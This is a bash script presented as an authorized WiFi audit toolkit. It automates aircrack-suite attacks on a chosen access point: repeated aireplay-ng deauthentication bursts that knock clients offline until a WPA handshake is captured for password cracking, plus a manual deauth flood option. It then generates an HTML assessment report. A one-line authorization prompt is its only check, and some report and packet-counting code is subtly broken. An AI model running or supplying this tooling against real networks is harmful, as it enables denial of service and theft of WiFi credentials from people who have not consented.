#!/bin/bash
# ======================================
#        FATFOX SECURITY TOOLKIT v1.7.0
#      Authorized WiFi Audit - AUTO-REPORT
# ======================================

# CONFIGURATION
CAPTURE_DIR="$PWD/captures"
DEAUTH_DIR="$PWD/deauth"
REPORT_DIR="$PWD/reports"
SESSION_DB="$PWD/.fatfox_session.json"
mkdir -p "$CAPTURE_DIR" "$DEAUTH_DIR" "$REPORT_DIR"

# COLORS
GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; PURPLE='\033[0;35m'; NC='\033[0m'

# Global session data
declare -A SESSION_DATA

# Load previous session
load_session() {
    [[ -f "$SESSION_DB" ]] && source <(jq -r 'to_entries[] | "SESSION_DATA[\"\(.key)\"]=\"\(.value)\""' "$SESSION_DB" 2>/dev/null)
}

# Save session
save_session() {
    jq -n --arg ssid "${SESSION_DATA["ssid"]:-}" \
       --arg bssid "${SESSION_DATA["bssid"]:-}" \
       --arg channel "${SESSION_DATA["channel"]:-}" \
       --arg clients "${SESSION_DATA["clients"]:-0}" \
       --arg packets "${SESSION_DATA["packets"]:-0}" \
       --arg handshakes "${SESSION_DATA["handshakes"]:-0}" \
       --arg status "${SESSION_DATA["handshake_status"]:-}" \
       --arg capfile "${SESSION_DATA["capfile"]:-}" \
       --arg deauth_logs "${SESSION_DATA["deauth_logs"]:-}" \
       '{
         ssid: $ssid, bssid: $bssid, channel: $channel, 
         clients: $clients, packets: $packets, handshakes: $handshakes,
         status: $status, capfile: $capfile, deauth_logs: $deauth_logs
       }' > "$SESSION_DB"
}

# AUTO-ANALYZE CAPTURE FILE
analyze_capture() {
    local cap_file="$1"
    [[ ! -f "$cap_file" ]] && return 1
    
    # Extract SSID/BSSID from filename or airodump
    local ssid=$(basename "$cap_file" .cap | sed 's/_[0-9]\{14\}$//' | sed 's/__/_/g')
    local bssid channel
    
    # Parse airodump header for details
    bssid=$(airodump-ng --read "$cap_file" 2>/dev/null | grep "BSSID" -A 20 | grep -m1 "([0-9A-F:]\{17\})" | grep -o "([0-9A-F:]\{17\})" | tr -d '()')
    channel=$(airodump-ng --read "$cap_file" 2>/dev/null | grep "CH" | head -1 | awk '{print $2}')
    
    # Advanced metrics
    SESSION_DATA["ssid"]="${ssid:-Unknown}"
    SESSION_DATA["bssid"]="${bssid:-Unknown}"
    SESSION_DATA["channel"]="${channel:-Unknown}"
    SESSION_DATA["capfile"]="$cap_file"
    
    # Client count from station table
    SESSION_DATA["clients"]=$(airodump-ng --read "$cap_file" 2>/dev/null | grep -c "^[0-9A-F:]\{17\}" || echo "0")
    
    # Packet count via tshark (more accurate) or fallback
    if command -v tshark >/dev/null; then
        SESSION_DATA["packets"]=$(tshark -r "$cap_file" -T fields -e frame.number 2>/dev/null | wc -l)
    else
        SESSION_DATA["packets"]=$(wc -l < "$cap_file" 2>/dev/null || echo "N/A")
    fi
    
    # Handshake detection (multiple methods)
    local hs1=$(aircrack-ng "$cap_file" 2>/dev/null | grep -ci "handshake")
    local hs2=$(grep -ci "4WAY HANDSHAKE" "$cap_file" 2>/dev/null)
    SESSION_DATA["handshakes"]=$((hs1 + hs2))
    SESSION_DATA["handshake_status"]=$([[ ${SESSION_DATA["handshakes"]} -gt 0 ]] && echo "✅ DETECTED" || echo "❌ NOT DETECTED")
    
    # Deauth logs
    SESSION_DATA["deauth_logs"]=$(find "$DEAUTH_DIR" -name "*.log" -mtime -1 2>/dev/null | wc -l)
    
    save_session
    echo -e "${GREEN}[+] AUTO-ANALYZED: ${SESSION_DATA["ssid"]} | ${SESSION_DATA["handshakes"]} handshakes${NC}"
}

# Generate PROFESSIONAL CLIENT REPORT
generate_client_report() {
    local report_file="$REPORT_DIR/FATFOX_Client_Report_$(date +%Y%m%d_%H%M%S).html"
    local audit_date=$(date '+%Y-%m-%d %H:%M:%S %Z')
    
    # Get latest deauth logs
    local recent_logs=$(find "$DEAUTH_DIR" -name "*.log" -mtime -7 | head -5 | xargs -I {} echo "<li><code>{}</code></li>" | tr '\n' ' ')
    
    cat << 'EOF' > "$report_file"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FATFOX WiFi Security Assessment</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;padding:20px}
        .container{max-width:1200px;margin:0 auto;background:white;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.1);overflow:hidden}
        .header{background:linear-gradient(135deg,#1e3c72 0%,#2a5298 100%);color:white;padding:40px 30px;text-align:center;position:relative}
        .header h1{font-size:2.5em;margin-bottom:10px;font-weight:300;letter-spacing:2px}
        .header .audit-id{font-size:1.1em;opacity:0.9;margin-bottom:20px}
        .status-badge{display:inline-block;padding:10px 25px;border-radius:50px;font-weight:bold;font-size:1.1em;margin:10px 0}
        .status-success{background:#d4edda;color:#155724;border:2px solid #28a745}
        .status-fail{background:#f8d7da;color:#721c24;border:2px solid #dc3545}
        .metrics-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:20px;margin:30px;padding:30px;background:#f8f9fa}
        .metric-card{background:white;border-radius:15px;padding:25px;text-align:center;box-shadow:0 5px 15px rgba(0,0,0,0.08);transition:transform 0.3s}
        .metric-card:hover{transform:translateY(-5px)}
        .metric-value{font-size:2.5em;font-weight:bold;color:#1e3c72;margin:10px 0}
        .metric-label{font-size:0.95em;color:#666;text-transform:uppercase;letter-spacing:1px}
        .risk-table{width:100%;border-collapse:collapse;margin:30px 0;border-radius:10px;overflow:hidden;box-shadow:0 5px 15px rgba(0,0,0,0.1)}
        .risk-table th{background:linear-gradient(135deg,#1e3c72,#2a5298);color:white;padding:20px;font-weight:500}
        .risk-table td{padding:20px;border-bottom:1px solid #eee}
        .risk-high{background:#fff5f5}
        .risk-medium{background:#fffbf0}
        .files-list{max-height:200px;overflow-y:auto;background:#f8f9fa;padding:15px;border-radius:10px;border-left:4px solid #1e3c72}
        .recommendations{padding:30px;background:#f0f8ff;border-radius:15px;margin:30px;border-left:5px solid #2196f3}
        .recommendation-item{margin-bottom:15px;padding:15px;background:white;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.05)}
        .footer{padding:30px;text-align:center;background:#f8f9fa;border-top:1px solid #eee;color:#666}
        @media (max-width:768px){.metrics-grid{grid-template-columns:1fr;padding:20px}}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 FATFOX WiFi Security Assessment</h1>
            <div class="audit-id">Professional Penetration Test Report | $(date '+%Y-%m-%d')</div>
EOF

    # DYNAMIC STATUS BADGE
    if [[ "${SESSION_DATA["handshake_status"]}" == *"DETECTED"* ]]; then
        cat << EOF >> "$report_file"
            <div class="status-badge status-success">✅ WPA HANDSHAKE CAPTURED</div>
EOF
    else
        cat << EOF >> "$report_file"
            <div class="status-badge status-fail">❌ NO HANDSHAKE CAPTURED</div>
EOF
    fi

    cat << EOF >> "$report_file"
        </div>
        
        <div class="metrics-grid">
            <div class="metric-card">
                <div class="metric-value">${SESSION_DATA["ssid"]}</div>
                <div class="metric-label">Network Name</div>
            </div>
            <div class="metric-card">
                <div class="metric-value">${SESSION_DATA["bssid"]}</div>
                <div class="metric-label">BSSID</div>
            </div>
            <div class="metric-card">
                <div class="metric-value">${SESSION_DATA["channel"]}</div>
                <div class="metric-label">Channel</div>
            </div>
            <div class="metric-card">
                <div class="metric-value">${SESSION_DATA["clients"]}</div>
                <div class="metric-label">Clients Detected</div>
            </div>
            <div class="metric-card">
                <div class="metric-value">${SESSION_DATA["packets"]}</div>
                <div class="metric-label">Packets Captured</div>
            </div>
            <div class="metric-card">
                <div class="metric-value">${SESSION_DATA["handshakes"]}</div>
                <div class="metric-label">Handshakes</div>
            </div>
        </div>

        <table class="risk-table">
            <thead>
                <tr><th colspan="4">🎯 Security Risk Assessment</th></tr>
                <tr><th>Risk</th><th>CVSS Score</th><th>Status</th><th>Business Impact</th></tr>
            </thead>
            <tbody>
                <tr class="risk-high">
                    <td>WPA Handshake Exposure</td>
                    <td>9.8/10</td>
                    <td>${SESSION_DATA["handshake_status"]}</td>
                    <td>Password cracking possible</td>
                </tr>
                <tr class="risk-high">
                    <td>Deauth Attack Vulnerability</td>
                    <td>8.6/10</td>
                    <td>Vulnerable</td>
                    <td>Network DoS possible</td>
                </tr>
                <tr class="risk-medium">
                    <td>Client Reconnection Delay</td>
                    <td>6.5/10</td>
                    <td>${SESSION_DATA["clients"]} clients</td>
                    <td>Service disruption</td>
                </tr>
            </tbody>
        </table>

        <div class="files-list">
            <h3>📁 Audit Evidence Files</h3>
            <ul>$recent_logs</ul>
            <p><strong>Main Capture:</strong> <code>$(basename "${SESSION_DATA["capfile"]}")</code></p>
        </div>

        <div class="recommendations">
            <h2>🛡️ Priority Remediation Actions</h2>
            <div class="recommendation-item">
                <h4>🔥 IMMEDIATE (Day 1)</h4>
                <ol>
                    <li>Enable <strong>802.11w Protected Management Frames (PMF)</strong></li>
                    <li>Change WiFi password to 25+ character passphrase</li>
                </ol>
            </div>
            <div class="recommendation-item">
                <h4>⚡ SHORT TERM (Week 1)</h4>
                <ol>
                    <li>Upgrade clients/AP to support WPA3</li>
                    <li>Enable wireless IDS monitoring</li>
                </ol>
            </div>
            <div class="recommendation-item">
                <h4>🎯 LONG TERM (Month 1)</h4>
                <ol>
                    <li>Network segmentation</li>
                    <li>Regular wireless security audits</li>
                </ol>
            </div>
        </div>

        <div class="footer">
            <p><strong>FATFOX Security Toolkit v1.7.0</strong> | Authorized Penetration Test | $(date '+%Y')</p>
            <p>Audit files secured at: <code>$PWD</code></p>
        </div>
    </div>
</body>
</html>
EOF

    echo -e "${GREEN}🎉 CLIENT REPORT GENERATED: $report_file${NC}"
    echo -e "${CYAN}📱 Open: xdg-open '$report_file'${NC}"
    echo -e "${PURPLE}💾 PDF: wkhtmltopdf '$report_file' '${report_file%.html}.pdf'${NC}"
}

# MAIN EXECUTION
clear
echo -e "${GREEN}======================================"
echo -e "      FATFOX SECURITY TOOLKIT v1.7.0"
echo -e "     🚀 FULLY AUTOMATED REPORTING"
echo -e "======================================${NC}"

read -p "Confirm written authorization? (yes/no): " AUTH
[[ "$AUTH" != "yes" ]] && { echo -e "${RED}Exiting.${NC}"; exit 1; }

# INTERFACE CHECK
MON_IFACE=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -1)
[[ -z "$MON_IFACE" ]] && { echo -e "${RED}[!] Start: sudo airmon-ng start wlan0${NC}"; exit 1; }
echo -e "${GREEN}[+] Interface: $MON_IFACE${NC}"

load_session

# ENHANCED MENU
while true; do
    echo -e "\n${CYAN}========== FATFOX v1.7.0 ==========${NC}"
    echo "1) 🎯 AUTO Handshake Capture + Deauth"
    echo "2) 📡 Basic Network Capture" 
    echo "3) ⚡ Manual Deauth Attack"
    echo "4) 📊 AUTO Client Report (Current Session)"
    echo "5) 🚀 Quick Report (Latest Capture)"
    echo "6) 🔍 Analyze Capture File"
    echo "7) 🧹 Cleanup (Keep 24h)"
    echo "8) ❌ Exit"
    echo -e "${CYAN}================================${NC}"
    
    read -p "→ " OPTION
    
    case $OPTION in
        1)
            echo -e "${PURPLE}[+] AUTO HANDSHAKE MODE${NC}"
            read -p "Target SSID: " SSID
            read -p "BSSID: " BSSID
            read -p "Channel: " CHANNEL
            
            TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
            CAP_FILE="$CAPTURE_DIR/${SSID// /-}_$TIMESTAMP.cap"
            
            echo -e "${GREEN}[+] Capturing: $CAP_FILE${NC}"
            sudo airodump-ng --bssid "$BSSID" --channel "$CHANNEL" -w "$CAP_FILE" "$MON_IFACE" &
            AIRO_PID=$!
            
            # Deauth loop with handshake check
            DEAUTH_LOG="$DEAUTH_DIR/${SSID// /-}_deauth_$TIMESTAMP.log"
            while kill -0 $AIRO_PID 2>/dev/null; do
                echo "$(date): Deauth burst → $BSSID" >> "$DEAUTH_LOG"
                sudo aireplay-ng -0 30 -a "$BSSID" "$MON_IFACE" >> "$DEAUTH_LOG" 2>&1
                sleep 8
                [[ -f "$CAP_FILE-01.cap" ]] && analyze_capture "$CAP_FILE-01.cap" && break
            done
            kill $AIRO_PID 2>/dev/null
            ;;
        2)
            echo -e "${PURPLE}[+] BASIC CAPTURE${NC}"
            read -p "Target BSSID: " BSSID
            read -p "Channel: " CHANNEL
            TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
            CAP_FILE="$CAPTURE_DIR/manual_$TIMESTAMP.cap"
            sudo airodump-ng --bssid "$BSSID" --channel "$CHANNEL" -w "$CAP_FILE" "$MON_IFACE"
            analyze_capture "$CAP_FILE-01.cap"
            ;;
        3)
            read -p "Target BSSID: " BSSID
            read -p "Packets (default 100): " PKTS; PKTS=${PKTS:-100}
            TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
            sudo aireplay-ng -0 $PKTS -a "$BSSID" "$MON_IFACE" | tee "$DEAUTH_DIR/manual_$TIMESTAMP.log"
            ;;
        4)
            [[ -z "${SESSION_DATA["ssid"]}" ]] && echo -e "${RED}[!] No session data. Run capture first.${NC}" || generate_client_report
            ;;
        5)
            LATEST=$(ls -t "$CAPTURE_DIR"/*.cap 2>/dev/null | head -1)
            [[ -n "$LATEST" ]] && { analyze_capture "$LATEST"; generate_client_report; } || echo -e "${RED}[!] No captures found${NC}"
            ;;
        6)
            echo -e "${YELLOW}[+] Captures:${NC}"; ls -laht "$CAPTURE_DIR"/*.cap 2>/dev/null
            read -p "File: " CAPFILE
            analyze_capture "$CAPFILE" && echo -e "${GREEN}[+] Analysis complete${NC}"
            ;;
        7)
            find "$CAPTURE_DIR" "$DEAUTH_DIR" -mtime +1 -delete 2>/dev/null
            echo -e "${GREEN}[+] Cleaned files >24h old${NC}"
            ;;
        8) echo -e "${GREEN}[+] Goodbye!${NC}"; exit 0;;
        *) echo -e "${RED}[!] Invalid${NC}";;
    esac
done
